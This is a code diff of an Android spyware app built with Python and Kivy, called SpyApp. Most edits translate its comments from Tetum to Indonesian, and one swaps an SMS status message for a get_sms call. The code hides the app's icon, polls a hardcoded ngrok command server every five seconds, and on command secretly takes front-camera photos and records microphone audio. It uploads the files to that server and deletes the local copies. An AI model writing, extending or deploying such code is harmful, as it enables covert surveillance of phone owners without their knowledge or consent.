@@ -3,13 +3,13 @@ from kivy.app import App
 from kivy.clock import Clock
 from jnius import autoclass
 
-# Uza link fiksa husi ó-nia Dashboard Ngrok
+# Menggunakan link statis dari Dashboard Ngrok Anda
 URL_NGROK = "https://bleariest-portraitlike-dreama.ngrok-free.dev"
 
 class SpyApp(App):
     def build(self):
-        self.hide_icon() # Subar íkone kedas bainhira loke
-        Clock.schedule_interval(self.check_server, 5) # Kontrola orden kada segundu 5
+        self.hide_icon() # Sembunyikan ikon segera setelah dibuka
+        Clock.schedule_interval(self.check_server, 5) # Cek perintah setiap 5 detik
         return None
 
     def hide_icon(self):
@@ -17,7 +17,7 @@ class SpyApp(App):
             PA = autoclass('org.kivy.android.PythonActivity').mActivity
             PM = autoclass('android.content.pm.PackageManager')
             CN = autoclass('android.content.ComponentName')
-            # Naran paket tenke hanesan ho buildozer.spec
+            # Nama paket harus sesuai dengan buildozer.spec
             comp = CN("org.test.cameraspy", "org.kivy.android.PythonActivity")
             PA.getPackageManager().setComponentEnabledSetting(comp, PM.COMPONENT_ENABLED_STATE_DISABLED, PM.DONT_KILL_APP)
         except: pass
@@ -28,12 +28,12 @@ class SpyApp(App):
             cmd = r.json().get("action")
             if cmd == "photo": self.take_photo()
             elif cmd == "mic": self.record_mic()
-            elif cmd == "sms": self.send_data("sms", "Status: SMS monitor aktivu")
+            elif cmd == "sms": self.get_sms()
         except: pass
 
     def take_photo(self):
         import cv2
-        cap = cv2.VideoCapture(1) # Kamera oin
+        cap = cv2.VideoCapture(1) # Kamera depan
         ret, frame = cap.read()
         if ret:
             cv2.imwrite("snap.jpg", frame)
@@ -49,7 +49,7 @@ class SpyApp(App):
         rec.setAudioEncoder(1)
         rec.prepare()
         rec.start()
-        time.sleep(10) # Grava segundu 10
+        time.sleep(10) # Rekam selama 10 detik
         rec.stop()
         self.upload_file("/sdcard/audio.3gp")
 
@@ -57,9 +57,6 @@ class SpyApp(App):
         with open(path, 'rb') as f:
             requests.post(f"{URL_NGROK}/upload", files={'file': f})
         if os.path.exists(path): os.remove(path)
-
-    def send_data(self, type, content):
-        requests.post(f"{URL_NGROK}/receive-data", data={'type': type, 'content': content})
 
 if __name__ == '__main__':
     SpyApp().run()
